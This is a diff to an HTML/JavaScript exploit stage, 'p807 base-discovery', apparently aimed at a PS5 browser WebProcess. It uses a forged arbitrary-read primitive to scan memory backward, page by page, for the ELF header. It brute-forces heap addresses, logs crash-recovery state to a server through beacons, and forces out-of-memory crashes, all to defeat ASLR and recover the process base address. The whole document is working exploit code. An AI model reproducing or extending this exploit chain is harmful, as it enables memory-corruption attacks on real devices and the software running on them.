@@ -1,27 +1,27 @@
 <!--
-  p710: base-discovery — scan backward from code segment to find WebProcess base
+  p807: base-discovery — scan backward from code segment to find WebProcess base
 
   Reuses p691 walk chain to get VP and s2 (lowest known code address),
   then scans backward in 4MB coarse steps (then 16KB binary search) to find
   the ELF magic 7F454C46 that marks the WebProcess text base.
 
-  Server-side state (/p710state) survives WebProcess crashes.
+  Server-side state (/p807state) survives WebProcess crashes.
   Final result: RVA = VP - base.
 
   Scan algorithm:
-    Phase 1 (coarse): from loCode (s2), step backward 4MB per read.
-      First read is at loCode itself (must be readable — it's a code fn).
-      Each read: ARM beacon → forgeRead(addr,16) → readStyle → ALIVE beacon.
-      If read crashes → server records death address; next load resumes.
+    Phase 1 (coarse): from VP, step backward 4MB per read through .rodata.
     Phase 2 (fine): binary search between lastOk and lastCrash, step 16KB.
-    Phase 3: scan first few pages at the boundary for ELF header.
+    Phase 3 (header): boundary found between .rodata (RO) and .text (XO).
+    Phase 4 (base-coarse): scan below s2 in 4MB steps looking for RO below .text.
+    Phase 5 (base-fine): binary search between readable RO and XO .text.
+    Phase 6 (base-scan): page-by-page through RO checking for ELF magic 7F454C46.
 
   CRASH_CLASS: HIGH
 -->
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>p710 base-discovery</title></head>
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p807 base-discovery</title></head>
 <body>
 <div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
-<pre id="out">p710</pre>
+<pre id="out">p807</pre>
 <script>
 'use strict';
 var SKIPJ=-1;
@@ -30,20 +30,26 @@ var UID=Math.random().toString(36).slice(2,8).toUpperCase();
 
 /* --- beacon infrastructure --- */
 function b(m){try{O.textContent+='\n'+m;}catch(e){}
-  try{var u=location.protocol+'//'+location.host+'/beacon/P710-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID;if(navigator.sendBeacon&&navigator.sendBeacon(u))return;}catch(e){}
-  try{new Image().src=location.protocol+'//'+location.host+'/beacon/P710-'+encodeURIComponent(m)+'?t='+Date.now();}catch(e){}}
-function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P710-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
+  try{var u=location.protocol+'//'+location.host+'/beacon/P807-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID;if(navigator.sendBeacon&&navigator.sendBeacon(u))return;}catch(e){}
+  try{new Image().src=location.protocol+'//'+location.host+'/beacon/P807-'+encodeURIComponent(m)+'?t='+Date.now();}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P807-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
+var _retryN=qint('r',0);
 function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;
-  if(k!=='ok'){setTimeout(function(){location.reload();},8000);}}
+  if(k!=='ok'){setTimeout(function(){
+    if(_retryN>=4){b('OOM-GUARD-crash-after-'+_retryN);
+      var _boom=[];for(var _bi=0;_bi<200;_bi++)_boom.push(new ArrayBuffer(16*1024*1024));
+      location.replace('/');}
+    else{location.replace('/document/es/ps5/p807?_='+Date.now()+'&r='+(_retryN+1));}
+  },6000);}}
 
 /* --- server state helpers --- */
 function getState(){
-  try{var x=new XMLHttpRequest();x.open('GET','/p710state',false);x.send(null);
+  try{var x=new XMLHttpRequest();x.open('GET','/p807state',false);x.send(null);
     if(x.status===200)return JSON.parse(x.responseText);
   }catch(e){}
   return null;
 }
-/* state is communicated entirely via beacons: P710-VP-, P710-ARM-, P710-ALIVE, etc. */
+/* state is communicated entirely via beacons: P807-VP-, P807-ARM-, P807-ALIVE, etc. */
 
 /* --- query params --- */
 function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
@@ -52,7 +58,7 @@ var SI=qint('si',0);
 var CTL=qint('ctl',0);
 var COARSE_STEP=qint('step',0x400000);
 var FINE_STEP=0x4000;
-var MAX_SCAN=qint('maxscan',512);
+var MAX_SCAN=qint('maxscan',2048);
 
 var SIZE=192, fired=false, faces=null;
 
@@ -214,31 +220,40 @@ function phase(){
 
         /* --- Step 5: Phase 3 — Self scan (from p691, simplified) --- */
         if(!selfFound){
-          var b2Ref=Number((L2>>16n)&0xFFn);
-          var b4Ref=Number((L2>>32n)&0xFFn);
+          /* SELF is always in low heap (byte2 ~0x20-0x38). Use the lowest
+             byte2 among T and W as reference — closest to SELF. */
+          var tB2=Number((L1>>16n)&0xFFn), wB2=Number((L2>>16n)&0xFFn);
+          var b2Ref=Math.min(tB2,wB2);
+          var b4Ref=0x10;
           var B4s=[b4Ref];
           var b4all=[0x10,0x08];
           for(var q8b=0x09;q8b<=0x0F;q8b++)b4all.push(q8b);
           for(var q9=0x11;q9<=0x1F;q9++)b4all.push(q9);
           for(var qw=0;qw<b4all.length;qw++){if(b4all[qw]!==b4Ref)B4s.push(b4all[qw]);}
 
-          var b2s=[];for(var q5=0;q5<256;q5++)b2s.push(q5);
-          b2s.sort(function(x,y){return Math.abs(x-b2Ref)-Math.abs(y-b2Ref);});
+          /* SELF byte2 has been 0x27 or 0x38 in every measured run.
+             Prioritize the 0x20-0x40 hot range, then sort outward from b2Ref. */
+          var hotB2=[];for(var hh=0x20;hh<=0x40;hh++)hotB2.push(hh);
+          hotB2.sort(function(x,y){return Math.abs(x-0x30)-Math.abs(y-0x30);});
+          var coldB2=[];for(var q5=0;q5<256;q5++){if(q5<0x20||q5>0x40)coldB2.push(q5);}
+          coldB2.sort(function(x,y){var da=Math.abs(x-b2Ref),db=Math.abs(y-b2Ref);
+            if(da!==db)return da-db;return(x>=b2Ref?0:1)-(y>=b2Ref?0:1);});
+          var b2s=hotB2.concat(coldB2);
           var b0a=[];for(var q6=0;q6<16;q6++)b0a.push(q6*16);
 
           var n3=0;
-          b('PH3-START-b4='+B4s[0]);
+          b('PH3-START-b4=0x'+B4s[0].toString(16)+'-b2=0x'+b2Ref.toString(16)+'-tB2=0x'+tB2.toString(16)+'-wB2=0x'+wB2.toString(16));
 
           for(var i8=0;i8<B4s.length&&!selfFound;i8++){
             for(var i7=0;i7<b2s.length&&!selfFound;i7++){
-              for(var q7=0;q7<0x7F&&!selfFound;q7++){
+              for(var q7=0;q7<0x100&&!selfFound;q7++){
                 for(var i6=0;i6<b0a.length&&!selfFound;i6++){
                   var sc=BigInt(b0a[i6])|(BigInt(q7)<<8n)|(BigInt(b2s[i7])<<16n)|(BigInt(B4s[i8])<<32n);
                   setR(sc+0x38n);n3++;
                   if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
                     self=sc;selfFound=true;
                   }
-                  if((n3%512)===0)b('PH3-'+n3);
+                  if((n3%16384)===0)b('PH3-'+n3);
                 }
               }
             }
@@ -325,7 +340,7 @@ function phase(){
               }
               if(/^[0-9a-f]{16}$/.test(hz)){
                 var bk=BigInt('0x'+hz.match(/../g).reverse().join(''));
-                if(bk>0x1000000000n&&bk<0x10000000000n)self=bk;
+                if(bk>0x1000000000n&&bk<0x10000000000n){self=bk;selfFound=true;}
               }
 
               if(VP>0x100000000n){
@@ -395,9 +410,13 @@ function phase(){
           return;
         }
 
-        var scanPhase=(st&&st.phase&&st.phase!=='idle')?st.phase:'coarse';
+        /* KNOWN from p710 run: boundary delta = 0x76DB28 (VP - .rodata bottom).
+           Skip coarse/fine/header and go straight to base-coarse. */
+        var KNOWN_BOUNDARY=0x76DB28n;
+        var scanPhase=(st&&st.phase&&st.phase!=='idle')?st.phase:'base-coarse';
         var lastOk=0n;
         var lastCrash=0n;
+        if(scanPhase==='coarse'||scanPhase==='fine'||scanPhase==='header')scanPhase='base-coarse';
 
         /* Translate stored deltas to current-boot addresses */
         if(st&&st.okDelta){
@@ -436,6 +455,32 @@ function phase(){
               if(lastOk-lastCrash<=BigInt(FINE_STEP)){
                 scanPhase='header';
               }
+            } else if(scanPhase==='base-coarse'){
+              lastCrash=deadAddr;
+              if(lastOk>0n&&lastOk-lastCrash<=BigInt(FINE_STEP)){
+                scanPhase='base-scan';
+              } else if(lastOk>0n){
+                scanPhase='base-fine';
+              }
+            } else if(scanPhase==='base-fine'){
+              lastCrash=deadAddr;
+              if(lastOk-lastCrash<=BigInt(FINE_STEP)){
+                scanPhase='base-scan';
+              }
+            } else if(scanPhase==='base-scan'){
+              lastCrash=deadAddr;
+              /* Crash-loop guard: if we died AT or near lastOk, the
+                 forgeRead can't survive here (PH3 degradation). lastOk
+                 IS the lowest readable page — declare base immediately. */
+              if(lastOk>0n && deadAddr>=lastOk-BigInt(FINE_STEP)){
+                var rva=VP-lastOk;
+                bs('BASE-LOOP-BREAK-died='+hex(deadAddr)+',ok='+hex(lastOk));
+                bs('BASE-'+hex(lastOk));
+                bs('PHASE-done');
+                bs('RVA-'+hex(rva));
+                verd('ok','BASE(loop)='+hex(lastOk)+'<br>VP='+hex(VP)+'<br>RVA='+hex(rva));
+                return;
+              }
             }
           }
           bs('PHASE-'+scanPhase);
@@ -468,18 +513,72 @@ function phase(){
             var mid=(lastOk+lastCrash)/2n;
             addr=mid&~0x3FFFn;
           } else if(scanPhase==='header'){
-            /* Boundary found: report measurements and done */
+            /* Boundary found — save it and transition to base search */
             var rodataOff=VP-lastOk;
             var textMin=lastOk-S2;
             bs('BOUNDARY-rodata='+hex(lastOk));
             bs('BOUNDARY-text-top='+hex(lastCrash));
             bs('BOUNDARY-VP-offset='+hex(rodataOff));
             bs('BOUNDARY-text-min-size='+hex(textMin));
-            bs('BOUNDARY-s2-below='+hex(lastOk-S2));
-            bs('PHASE-done');
-            bs('SCAN-RESULT-boundary='+hex(lastOk)+',VP='+hex(VP)+',s2='+hex(S2)+',rodata_off='+hex(rodataOff));
-            verd('ok','BOUNDARY='+hex(lastOk)+'<br>VP='+hex(VP)+'<br>.rodata offset='+hex(rodataOff)+'<br>.text min='+hex(textMin)+'<br>ELF header unreachable (XO .text)');
-            return;
+            bs('BSAVE-'+hex(rodataOff));
+
+            /* Reset ok/crash for base search below .text */
+            lastOk=0n; lastCrash=0n;
+            bs('OKDELTA-0x0'); bs('CRASHDELTA-0x0');
+            scanPhase='base-coarse'; scanIdx=0;
+            bs('PHASE-base-coarse');
+            bs('BASE-SEARCH-START-textMin='+hex(textMin));
+            continue;
+          } else if(scanPhase==='base-coarse'){
+            /* Scan below .text in 32MB steps to find the BOTTOM of the readable region.
+               The ELF header is at or near the bottom of the mapping. */
+            var bstep=0x2000000n;
+            if(lastOk>0n){
+              addr=(lastOk-bstep)&~0x3FFFn;
+            } else if(lastCrash>0n){
+              /* Previous crash with no ok yet — skip below it */
+              addr=(lastCrash-bstep)&~0x3FFFn;
+            } else {
+              /* First step: start 2 big steps below s2 (lowest known code addr) */
+              addr=(S2-BigInt(2)*bstep)&~0x3FFFn;
+            }
+          } else if(scanPhase==='base-fine'){
+            /* LINEAR SCAN downward from lastOk in 16KB pages.
+               Each read returns data until we hit the ELF header (= base) or crash (below base).
+               4MB gap = 256 reads in ~15s. Typically ZERO additional crashes. */
+            addr=(lastOk-BigInt(FINE_STEP))&~0x3FFFn;
+            if(lastCrash>0n&&addr<=lastCrash){
+              scanPhase='base-scan';scanIdx=0;
+              bs('PHASE-base-scan');
+              bs('LINSCAN-GAP-EXHAUSTED-bottom='+hex(lastOk));
+              lastCrash=0n;bs('CRASHDELTA-0x0');
+              continue;
+            }
+          } else if(scanPhase==='base-scan'){
+            /* lastOk IS the lowest readable page (= binary base).
+               Read it to check for ELF magic; if not, the base is still lastOk.
+               Scan UP a few pages to verify, not down through 100MB. */
+            if(lastOk===0n){
+              var bst=getState();
+              if(bst&&bst.okDelta){
+                lastOk=VP-BigInt(bst.okDelta);
+              } else {
+                bs('BASE-SCAN-NO-STATE');
+                verd('bad','base-scan: no lastOk');
+                return;
+              }
+            }
+            /* Scan the bottom page and up to 4 pages above it */
+            addr=lastOk+BigInt(scanIdx)*BigInt(FINE_STEP);
+            if(scanIdx>=5){
+              /* Checked 5 pages from the bottom — declare the base */
+              var rva=VP-lastOk;
+              bs('BASE-NO-ELF-BUT-MAPPED-'+hex(lastOk));
+              bs('PHASE-done');
+              bs('RVA-'+hex(rva));
+              verd('ok','BASE(no-elf)='+hex(lastOk)+'<br>VP='+hex(VP)+'<br>RVA='+hex(rva));
+              return;
+            }
           }
 
           if(addr<=0x100000000n||addr>0x10000000000n){
@@ -487,11 +586,20 @@ function phase(){
             verd('bad','SCAN OUT OF RANGE '+hex(addr));
             return;
           }
+          /* Safety: base search must stay within 512MB of VP */
+          if(scanPhase.startsWith('base-')&&VP-addr>0x20000000n){
+            bs('BASE-TOO-FAR-'+hex(VP-addr));
+            bs('PHASE-done');
+            verd('bad','BASE search exceeded 512MB ('+hex(VP-addr)+')');
+            return;
+          }
 
-          /* ARM: tell server; also send the VP-delta so death detection works across boots */
-          bs('ARM-addr='+hex(addr));
+          /* ARM: tell server the VP-delta (for crash recovery across ASLR slides).
+             During base-fine linear scan, skip verbose beacons for speed. */
+          var _linscan=(scanPhase==='base-fine'&&scanIdx>0);
+          if(!_linscan)bs('ARM-addr='+hex(addr));
           bs('ARMDELTA-'+hex(VP-addr));
-          bs('PHASE-'+scanPhase);
+          if(!_linscan)bs('PHASE-'+scanPhase);
 
           /* Perform the read — this may crash WebProcess */
           restoreAndForge(snap2,addr,16);
@@ -499,13 +607,15 @@ function phase(){
           try{rd=readStyle();}catch(e){rd='THROW';}
           restoreAll(snap2);
 
-          bs('ALIVE');
+          if(!_linscan)bs('ALIVE');
 
           var readable=(rd!=='THROW'&&rd.length>=2);
           var isElf=readable&&(rd.length>=8&&rd.slice(0,8)==='7f454c46');
 
-          if(readable)bs('READ-addr='+hex(addr)+',data='+rd.slice(0,32));
-          else bs('READ-EMPTY-'+hex(addr));
+          if(isElf||!_linscan){
+            if(readable)bs('READ-addr='+hex(addr)+',data='+rd.slice(0,32));
+            else bs('READ-EMPTY-'+hex(addr));
+          }
 
           /* === Check for ELF magic in ANY phase === */
           if(isElf){
@@ -542,6 +652,50 @@ function phase(){
               scanPhase='header';scanIdx=0;
               bs('PHASE-header');
               bs('FINE-CONVERGED-ok='+hex(lastOk));
+            }
+          } else if(scanPhase==='base-coarse'){
+            if(readable){
+              lastOk=addr;
+              saveDelta(lastOk,lastCrash);
+              bs('BASE-COARSE-OK-'+hex(addr));
+              /* Keep going DOWN — don't transition to base-scan yet.
+                 We need to find the crash (bottom of mapping) first. */
+            } else {
+              /* Crash = below the binary mapping. Binary-search between lastOk and here. */
+              lastCrash=addr;
+              saveDelta(lastOk,lastCrash);
+              if(lastOk>0n){
+                if(lastOk-lastCrash<=BigInt(FINE_STEP)){
+                  /* Already converged — scan the bottom page for ELF */
+                  scanPhase='base-scan';scanIdx=0;
+                  bs('PHASE-base-scan');
+                  bs('BASE-COARSE-CONVERGED-bot='+hex(lastOk));
+                  lastCrash=0n;
+                  bs('CRASHDELTA-0x0');
+                } else {
+                  scanPhase='base-fine';
+                  bs('PHASE-base-fine');
+                  bs('BASE-COARSE-CRASH-ok='+hex(lastOk)+',crash='+hex(lastCrash));
+                }
+              }
+            }
+          } else if(scanPhase==='base-fine'){
+            /* Linear scan: readable → move lastOk DOWN; crash → checkpoint + refine */
+            if(readable){lastOk=addr;}else{lastCrash=addr;}
+            if(scanIdx%8===0||!readable)saveDelta(lastOk,lastCrash);
+            if(scanIdx%32===0)bs('LINSCAN-'+scanIdx+'-addr='+hex(addr));
+            if(lastOk>0n&&lastCrash>0n&&lastOk-lastCrash<=BigInt(FINE_STEP)){
+              scanPhase='base-scan';scanIdx=0;
+              bs('PHASE-base-scan');
+              bs('BASE-FINE-DONE-bottom='+hex(lastOk));
+              lastCrash=0n;
+              bs('CRASHDELTA-0x0');
+            }
+          } else if(scanPhase==='base-scan'){
+            if(readable){
+              bs('BASE-SCAN-'+scanIdx+'-at-'+hex(addr));
+            } else {
+              bs('BASE-SCAN-CRASH-'+hex(addr));
             }
           }
 
